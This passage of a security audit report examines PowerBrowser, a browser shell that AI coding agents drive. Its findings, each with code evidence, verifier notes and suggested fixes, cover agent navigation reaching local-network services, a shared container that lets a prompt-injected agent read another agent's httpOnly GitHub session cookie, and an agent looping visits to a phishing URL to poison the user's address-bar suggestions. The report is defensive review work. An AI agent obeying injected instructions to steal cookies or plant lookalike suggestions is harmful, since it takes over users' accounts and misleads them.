**Verifier (CONFIRMED, low).** browser.goto goes through agentUrl (PowerBrowserAPI.sys.mjs:11465) to webTabNavigate (:11624). The `navigate` page command reaches the same function through the webTabNavigate group mutation (:2816-2820). webTabNavigate (:4145-4149) refuses anything but about:blank and http(s), and checks no host. A grep of the tree outside upstream finds no network.lna pref, no host deny list, and no loopback or RFC 1918 filter in the agent bridge. The agent network observer (:11540-11575) only records requests. The load uses a null triggering principal from chrome, so Gecko's local-network protections for web-initiated subresource requests do not apply to it either. Content can then be read through browser.snapshot or browser.eval in the agent child. As the finding says, the Theia sidecar is protected separately by its token cookie (held in the user container) and by the D-17 Origin gate. Impact depends on an unauthenticated local or LAN service being present, so low. *Checked at:* PowerBrowserAPI.sys.mjs:4147: `if (spec !== "about:blank" && !/^https?:\/\//i.test(spec)) return "refused-scheme"` is the only check. No host check was found on either navigation path.

## chrome-actor-04: All agents share one public container; browser.cookie.get with no URL returns every agent-container cookie, httpOnly included

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:11488`
- **Owner decision cited:** D-41

**What is wrong.** agentContainerId creates one public ContextualIdentity, 'PowerBrowser Orca agents', that every agent tab of every worktree and agent session uses. agentCookieGet with no url returns getCookiesWithOriginAttributes({userContextId}): the whole container's jar, httpOnly cookies included. A prompt-injected agent in one worktree can read session cookies another agent's tab obtained, or that the user created by signing an agent tab into a site so the agent could work. The identity is public, so the user (stock container menus) and WebExtensions with the contextualIdentities or cookies permission can also use this jar.

**Scenario.** The user signs agent A's tab into GitHub so agent A can open a PR. Agent B, in another worktree and steered by a malicious README, calls browser.cookie.get with no params on its own agent tab and receives GitHub's httpOnly user_session cookie.

**Preconditions.** Two or more agents use agent tabs, or the user signs an agent tab into a site.

**Evidence.** PowerBrowserAPI.sys.mjs:11258 `const identity = lazy.ContextualIdentityService.create("PowerBrowser Orca agents", "fingerprint", "purple");` (one id stored in the pref powerbrowser.orca.agentUserContextId); 11488 `const cookies = host ? Services.cookies.getCookiesFromHost(host, attrs) : Services.cookies.getCookiesWithOriginAttributes(JSON.stringify(attrs));` with attrs = { userContextId: entry.agentUserContextId }; the mapping returns httpOnly cookies (`httpOnly: c.isHttpOnly`).

**Suggested fix.** Use one container per Orca worktree or agent session (or per browserProfileId Orca already sends), and use a private or hidden identity (ContextualIdentityService private identities) so the jar is not offered in user container menus. Consider limiting cookie.get with no URL to the tab's current site.

**Verifier (CONFIRMED, low).** agentContainerId (PowerBrowserAPI.sys.mjs:11252-11265) creates or reuses one public ContextualIdentity, 'PowerBrowser Orca agents', whose id is kept in one pref, and every agent overlay uses it (3588). agentCookieGet (11482-11492) with no url returns getCookiesWithOriginAttributes for that whole userContextId, httpOnly cookies included (isHttpOnly is mapped). With a url, it reads any host's cookies in that container through getCookiesFromHost. The only requirement is that the calling tab pass the agent wall (11758), which an agent's own tab does. Agent B can therefore read cookies that agent A's tab or the user's sign-in put into the container. Mitigating context: under D-12, agents run with skip-permissions and a shell as the user, so a prompt-injected agent can already copy persistent cookies, including other containers', from the profile's cookies.sqlite. The real gain is limited to session-only cookies and to the clean API path. Upstream Orca also shares one partition per browser profile. *Checked at:* PowerBrowserAPI.sys.mjs:11258 creates the single identity. 11488 reads the whole container's jar. 11490 includes httpOnly cookies. No per-agent or per-worktree partition exists.

## chrome-actor-05: Agent browsing is written into the user's global history and tab store, so an agent can seed the user's address-bar suggestions

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:3620`

**What is wrong.** The agent branch of webTabOpen changes usercontextid, messagemanagergroup and autocompletepopup. It does not set disableglobalhistory, and webTabAttach registers the overlay's tab-store row as for any user tab. Places is not partitioned by container, so every page an agent visits, with its page-controlled title, enters the history that the suggestion rows (NG-023) and Panorama read. A prompt-injected agent can visit an attacker URL repeatedly under a title like 'GitHub - Sign in', raising its frecency until it is a top suggestion when the user types 'github' in a user tab.

**Scenario.** A prompt-injected agent loops browser.goto https://github-login.example/ 50 times; the page sets document.title = 'GitHub · Sign in'. The user later types 'github' in the chrome bar of a normal tab and gets the attacker URL as a high suggestion.

**Preconditions.** The docshell records global history for these overlays (the default for a XUL browser without disableglobalhistory). Not measured live.

**Evidence.** PowerBrowserAPI.sys.mjs:3620 `...(agent === true ? { "usercontextid": String(userContextId), messagemanagergroup: AGENT_MESSAGE_MANAGER_GROUP, "autocompletepopup": "" } : {})` with no disableglobalhistory attribute anywhere in the file (grep finds none); 3653 `const entry = PowerBrowserAPI.webTabAttach(theiaBrowser, actorRef, tabId, browser, key, spec, grant);` for agent tabs as well.

**Suggested fix.** Set disableglobalhistory on agent overlays (and skip or mark their tab-store rows), or filter agent-container visits out of suggestions.

**Verifier (CONFIRMED, low).** The agent branch at PowerBrowserAPI.sys.mjs:3620 sets usercontextid, messagemanagergroup and autocompletepopup. No disableglobalhistory attribute appears anywhere in the file. Gecko sets UseGlobalHistory on a top content browsing context to !HasAttr(disableglobalhistory) (upstream/docshell/base/BrowsingContext.cpp:820-821), so agent overlays record visits into Places, which is not partitioned by container. webTabAttach (3653, 3699-3704) writes the tab-store row for agent tabs as for user tabs. That an agent can thereby seed the user's history and suggestions follows statically. How high the attacker URL ranks for a typed 'github' depends on runtime frecency weighting, which I did not settle, but the write itself is certain. A prompt-injected agent can loop browser.goto, which passes the wall. *Checked at:* upstream/docshell/base/BrowsingContext.cpp:820-821 `txn.SetUseGlobalHistory(!aEmbedder->HasAttr(nsGkAtoms::disableglobalhistory))`. PowerBrowserAPI.sys.mjs:3620 sets no such attribute.

## chrome-actor-06: Page-menu edit rows on a text field in an agent tab always fail: PowerBrowserEditState is registered for the 'browsers' group only

- **Severity:** low
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/shell/PowerBrowserAPI.sys.mjs:9062`

**What is wrong.** WINDOWS 43 routes a text-field edit row to `global.getActor(EDIT_STATE_ACTOR_NAME)`. That actor is registered with messageManagerGroups ['browsers'], and agent overlays are in 'powerbrowser-orca-agent', so getActor throws NotSupportedError. handlePageMenuAction catches it and answers 'the page menu row failed'. Undo, Redo, Delete and Select All on an input in an agent tab never run. Cut, Copy and Paste are refused by D-38 anyway. pageEditTargetCommands falls back to cached state, so the rows appear enabled.

**Scenario.** The user right-clicks a text field in an agent tab while it is shown and picks Undo. The row fails with the generic error bar instead of undoing.

**Preconditions.** The user opens the page menu on a text input in an agent tab.

**Evidence.** PowerBrowserAPI.sys.mjs:9062 `data.context.onTextInput ? global.getActor(EDIT_STATE_ACTOR_NAME).sendAsyncMessage("PowerBrowserEditState:Do", { cmd }) : ...`; 10031-10037 `registerEditStateActor() { ... messageManagerGroups: ["browsers"], allFrames: true }`; 3620 sets agent overlays' messagemanagergroup to AGENT_MESSAGE_MANAGER_GROUP.

**Suggested fix.** Add AGENT_MESSAGE_MANAGER_GROUP to the edit-state pair's messageManagerGroups, or fall back to the Controllers actor when getActor throws.

**Verifier (CONFIRMED, low).** registerEditStateActor (PowerBrowserAPI.sys.mjs:10031-10038) registers PowerBrowserEditState with messageManagerGroups ['browsers']. Agent overlays use AGENT_MESSAGE_MANAGER_GROUP 'powerbrowser-orca-agent' (11127, 3620). The stock ContextMenu and Controllers actors have no group restriction (DesktopActorRegistry.sys.mjs:416-428, ActorManagerParent.sys.mjs:239-248), so the page menu does open on agent tabs. Nothing on the page-menu path (handlePageMenuAction 8722-8791, runPageMenuRow 8895-8903) special-cases agent tabs. pageMenuEdit (9056-9063) calls global.getActor(EDIT_STATE_ACTOR_NAME) when the menu was opened on a text input. getActor throws for a window global whose group the actor does not cover, and the catch at 8787-8789 answers 'the page menu row failed'. pageEditTargetCommands (10976-10983) swallows the same throw and returns the cached state, so the rows look enabled. As stated, Undo, Redo, Delete and Select All on agent-tab fields fail. This is a correctness bug, not a security issue. *Checked at:* PowerBrowserAPI.sys.mjs:10035 `messageManagerGroups: ["browsers"]`. 9061 calls getActor unconditionally on onTextInput. 8787-8789 maps the throw to the generic failure.

